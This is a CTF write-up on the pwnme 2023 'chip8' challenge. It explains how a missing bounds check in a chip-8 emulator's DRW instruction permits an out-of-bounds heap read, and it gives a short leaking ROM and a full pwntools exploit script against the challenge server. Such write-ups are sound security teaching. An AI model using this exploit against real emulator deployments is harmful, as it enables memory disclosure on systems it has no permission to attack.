---
title: "[pwnme 2023] chip8"
date: 2023-05-08
tags: ["ctf", "nasm", "pwn", "linux", "pwnme", "chip8", "emulator"]
---

## chip8

>Solves: 24  Easy
>
>I just found a repo of a chip-8 emulator, it may be vulnerable but I didn't had enough time to report the vulnerability with a working PoC.
>You must find a way to get the flag in memory on the remote service !
>
>Author: Express#8049
>
>Remote service at : nc 51.254.39.184 1337

chip8 is a emulator-pwn challenge I did during the [pwnme CTF](https://pwnme.fr/) . You can find the related files [here](https://github.com/ret2school/ctf/tree/master/2023/pwnme/pwn/chip8).

## Code review

This challenge is based on an emulator called [c8emu](https://github.com/LakshyAAAgrawal/chip8emu) that is updated with these lines of code:
```
diff --git a/include/Machine.hpp b/include/Machine.hpp
index af3d0d7..4288e15 100644
--- a/include/Machine.hpp
+++ b/include/Machine.hpp
@@ -17,6 +17,7 @@ class Machine{
 private:
 	std::vector<uint8_t> registers; // V0-VF
 	std::vector<uint8_t> memory; // Memory
+	std::vector<uint8_t> flag;
 	uint16_t I; // Index register
 	std::vector<uint16_t> stack; // Stack
 	uint8_t SP; // Stack Pointer
diff --git a/src/Machine.cpp b/src/Machine.cpp
index d34680e..2321296 100644
--- a/src/Machine.cpp
+++ b/src/Machine.cpp
@@ -6,10 +6,13 @@
 #include <chrono>
 #include <thread>
 
+std::string FLAG = "PWNME{THIS_IS_A_SHAREHOLDER_AAAAAAAAAAAAAAAAAA}";
+
 Machine::Machine(){
 	registers = std::vector<uint8_t>(16, 0);
 	stack = std::vector<uint16_t>(32, 0);
 	memory = std::vector<uint8_t>(4096, 0);
+	flag = std::vector<uint8_t>(128, 0);
 	PC = 0x200;
 	last_tick = std::chrono::steady_clock::now();
 	I = 0;
@@ -134,8 +137,8 @@ void Machine::execute(uint16_t& opcode){

 	if(it != first_match.end()) (it->second)(opcode);
 	else {
-		std::cout << "No match found for opcode " << std::hex << (int) opcode << "\n";
-		std::cout << "This could be because this ROM uses SCHIP or another extension which is not yet supported.\n";
+		//std::cout << "No match found for opcode " << std::hex << (int) opcode << "\n";
+		//std::cout << "This could be because this ROM uses SCHIP or another extension which is not yet supported.\n";
 		std::exit(0);
 	}
 }
@@ -179,12 +182,13 @@ void Machine::print_machine_state(){
 }
 
 void Machine::runLoop(){
+	std::copy(FLAG.begin(), FLAG.end(), flag.begin());
 	while(true){
 		// Update display
 		if(ge.is_dirty()){ // Check if the screen has to be updated
 			ge.update_display();
-			print_machine_state();
-			std::cout << "Opcode " << ((uint16_t) (memory[PC]<<8) | (memory[PC+1])) << "\n";
+			//print_machine_state();
+			//std::cout << "Opcode " << ((uint16_t) (memory[PC]<<8) | (memory[PC+1])) << "\n";
 		}
 
 		// Update the keyboard buffer to check for all pressed keys
diff --git a/src/c8emu.cpp b/src/c8emu.cpp
index e65123b..590228e 100644
--- a/src/c8emu.cpp
+++ b/src/c8emu.cpp
@@ -17,6 +17,10 @@ void loadFile(const std::string& filename, std::vector<uint8_t>& prog){
 int main(int argc, char ** argv){
 	Machine machine;
 
+	setbuf(stdin, NULL);
+	setbuf(stdout, NULL);
+	setbuf(stderr, NULL);
+
 	{ // Create block to deallocate the possibly large variable prog
 		// Load Instructions
 		std::vector<uint8_t> prog;
```

As you can see above, the prints that can leak informations about the program execution are removed, and an array named `flag` (on the heap) is inserted right after the memory mapping of length `0x1000` (on the heap) of the chip8 program. This way the goal would be to be able to leak the content of `flag` onto the screen.

## few words on chip8 architecture

To get a quick overview of the chip8 arch, I advice you to read [this](http://devernay.free.fr/hacks/chip8/C8TECH10.HTM#0.0). Here are the most important informations from the technical reference:
-  Chip-8 is a simple, interpreted, programming language which was first used on some do-it-yourself computer systems in the late 1970s and early 1980s. The COSMAC VIP, DREAM 6800, and ETI 660 computers are a few examples. These computers typically were designed to use a television as a display, had between 1 and 4K of RAM, and used a 16-key hexadecimal keypad for input. The interpreter took up only 512 bytes of memory, and programs, which were entered into the computer in hexadecimal, were even smaller.
- Chip-8 has 16 general purpose 8-bit registers, usually referred to as Vx, where x is a hexadecimal digit (0 through F). There is also a 16-bit register called I. This register is generally used to store memory addresses, so only the lowest (rightmost) 12 bits are usually used.
- Here are the instruction we need: 
    - `Annn` - `LD I, addr`. Set I = nnn. The value of register I is set to nnn.
    - `6xkk` - `LD Vx, byte`, Set Vx = kk. The interpreter puts the value kk into register Vx. 
    - `Fx1E` - `ADD I, Vx`. Set I = I + Vx. The values of I and Vx are added, and the results are stored in I.
    - `Dxyn` - `DRW Vx, Vy, nibble`. Display n-byte sprite starting at memory location I at (Vx, Vy), set VF = collision. The interpreter reads n bytes from memory, starting at the address stored in I. These bytes are then displayed as sprites on screen at coordinates (Vx, Vy). Sprites are XORed onto the existing screen. If this causes any pixels to be erased, VF is set to 1, otherwise it is set to 0. If the sprite is positioned so part of it is outside the coordinates of the display, it wraps around to the opposite side of the screen. See instruction 8xy3 for more information on XOR, and section 2.4, Display, for more information on the Chip-8 screen and sprites.

```nnn or addr - A 12-bit value, the lowest 12 bits of the instruction
n or nibble - A 4-bit value, the lowest 4 bits of the instruction
x - A 4-bit value, the lower 4 bits of the high byte of the instruction
y - A 4-bit value, the upper 4 bits of the low byte of the instruction
kk or byte - An 8-bit value, the lowest 8 bits of the instruction 
```

## The bug

The bug lies into the implementation around the instruction that use the `I` register. Indeed, as you read above, the `I` register is 16 bits wide. Thus we could we print onto the screen with the help of the `DRW` instruction data stored from `memory[I=0]` up to `memory[I=2^16 - 1]`. Let's see how does it  handle the `DRW` instruction:
```c
// https://github.com/LakshyAAAgrawal/chip8emu/blob/master/src/Machine.cpp#L123

{0xd000, [this](uint16_t& op){ // TODO - Dxyn - DRW Vx, Vy, nibble
    registers[0xf] = ge.draw_sprite(memory.begin() + I, memory.begin() + I + (op & 0x000f), registers[(op & 0x0f00)>>8] % 0x40, registers[(op & 0x00f0)>>4] % 0x20);
}}
```

The first and the second argument are the begin and the end of the location where data to print are stored. `(op & 0x000f)` represents the amount of bytes we'd like to print. As you can see no checks are performed, this way we able to get a read out of bound from from `memory[I=0]` up to `memory[I=2^16 - 1]`.

## Exploitation

Now we now how we could exfiltrate the flag we can write this tiny chip8 program:
```py
code = [
    0xAFFF, # Annn - LD I, addr, I  = 0xfff
    0x6111, # 6xkk - LD Vx, byte, R1 = 0x11
    0xF11E, # ADD I, R1, I => 0x1010
    0xDBCF  # Write on screen (xored with current pixels) 15 bytes from I=0x1010
]
```

We read the flag from `memory[0x1010]` given `memory` is adjacent to the `flag` (`memory[0x1000]` == begin of the chunk `flag` within the heap), and we add `0x10` to read the chunk content which is right after the header (prev_sz and chunk_sz). Once we launch it we get:
```
python3 exploit.py REMOTE HOST=51.254.39.184 PORT=1337
[*] '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/pwnme/pwn/chip8/wrapper'
    Arch:     amd64-64-little
╔════════════════════════════════════════════════════════════════╗
║ █ █ ▄▄▄                                                        ║
║ █  ██▀▄                                                        ║
║ █▄▄▄▀▄█                                                        ║
║ █  ▄ ▀▀                                                        ║
║ ▄██   ▀                                                        ║
║  █▄█▀ ▀                                                        ║
║ ▀▄█▀▀██                                                        ║
║ ▀▀ ▀▀ ▀                                                        ║
```

If we decode chars by hand (each byte is a line for which white is 1 and black zero), we get:
```
╔════════════════════════════════════════════════════════════════╗
║ █ █ ▄▄▄                                                        ║PW
║ █  ██▀▄                                                        ║NM
║ █▄▄▄▀▄█                                                        ║E{
║ █  ▄ ▀▀                                                        ║CH
║ ▄██   ▀                                                        ║18
║  █▄█▀ ▀                                                        ║-8
║ ▀▄█▀▀██                                                        ║_3
║ ▀▀ ▀▀ ▀                                                         m
```

If we repeat this step 4 times (by incrementing the value of V1), we finally managed to get the flag: `PWNME{CH1p-8_3mu14t0r_1s_h4Ck4bl3_1n_2023_y34h}`.

## Full exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn

BINARY = "wrapper"
LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"
LD = "/lib64/ld-linux-x86-64.so.2"

# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8  = pwn.p8
u8  = pwn.u8

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
source ~/Downloads/pwndbg/gdbinit.py
'''.format(**locals())

pwn.context.endianness = 'big'

STEP=0

def exp():
    io = start()

    # every registers are zero-ed at the begin of the program
    code = [
        0xAFFF, # Annn - LD I, addr, I  = 0xfff
		0x6111 + 0xf*STEP, # 6xkk - LD Vx, byte, R1 = 0x1F
        0xF11E, # ADD I, R1, I => 0x101F
		0xDBCF  # Write on screen (xored with current pixels) 15 bytes from I
    ]

    code_to_send = [pwn.p16(k) for k in code]

    io.sendafter(b"Enter ROM code: ", b"".join(code_to_send))
    io.sendline(b"\n")
    io.sendline(b"\n")

    io.sendline(b"\n")

    io.interactive()

if __name__ == "__main__":
    exp()

"""
PWNME{CH1p-8_3mu14t0r_1s_h4Ck4bl3_1n_2023_y34h}
╔════════════════════════════════════════════════════════════════╗
║ █ █ ▄▄▄                                                        ║PW
║ █  ██▀▄                                                        ║NM
║ █▄▄▄▀▄█                                                        ║E{
║ █  ▄ ▀▀                                                        ║CH
║ ▄██   ▀                                                        ║18
║  █▄█▀ ▀                                                        ║-8
║ ▀▄█▀▀██                                                        ║_3
║ ▀▀ ▀▀ ▀                                                         m

second part
╔════════════════════════════════════════════════════════════════╗
║ ██▄▀█ █                                                        ║mu
║  ██ ▄ ▀                                                        ║14
║ ▀██ ▀                                                          ║t0
║ █▀█▄▄█▄                                                        ║r_
║ ▄██  ▄█                                                        ║1s
║ █▄▀█▀▀▀                                                        ║_h
║ ▄▀▀ ▀▄▄                                                        ║4C
║ ▀▀ ▀ ▀▀                                                        ║k

part three:
════════════════════════════════════════════════════════════════╗
║ ▄█▀ ▀▄                                                         ║4b
║ ▀█▄▀▀▄▄                                                        ║l3
║ ▀▄█▀▀▀█                                                        ║_1
║ █▀▄███▄                                                        ║n_
║  ██  ▀                                                         ║20
║  ██  █▄                                                        ║23
║ █▄██▀▀█                                                        ║_y
║  ▀▀  ▀▀                                                         3

part four

║ ▄█▀▄▀                                                          ║4h
║ ▀▀▀▀▀ ▀                                                        ║}


"""
```